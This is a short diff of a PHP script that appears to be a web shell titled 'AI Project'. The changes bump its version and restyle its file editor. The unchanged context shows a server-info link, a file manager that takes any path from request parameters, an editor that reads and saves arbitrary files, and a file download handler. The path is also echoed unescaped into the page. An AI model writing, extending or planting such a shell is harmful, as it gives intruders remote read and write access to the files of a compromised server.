@@ -5,7 +5,7 @@ echo '<!DOCTYPE HTML>
 <html>
 <head>
 <link href="" rel="stylesheet" type="text/css">
-<title>AI Project v1.1</title>
+<title>AI Project v1.2</title>
 <style>
 body{
 background-color: black;
@@ -38,7 +38,7 @@ border-radius:5px;
 </style>
 </head>
 <body>
-<h1><center><font color="aqua">AI Project v1.1</font></center></h1>
+<h1><center><font color="aqua">AI Project v1.2</font></center></h1>
 
 <center>
 			<a href="?server_info">
@@ -324,7 +324,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
 
 				fclose($fp);
 			}
-			echo '<form method="POST"><textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Save" /></form>';
+			echo '<form method="POST"><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Save" /> <textarea cols=1000 rows=60 name="src" style="background:#000000;color:#30FF00">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br /></form>';
 
 		}elseif($_POST['opt'] == 'download') {
 			$path = $_POST['path'];
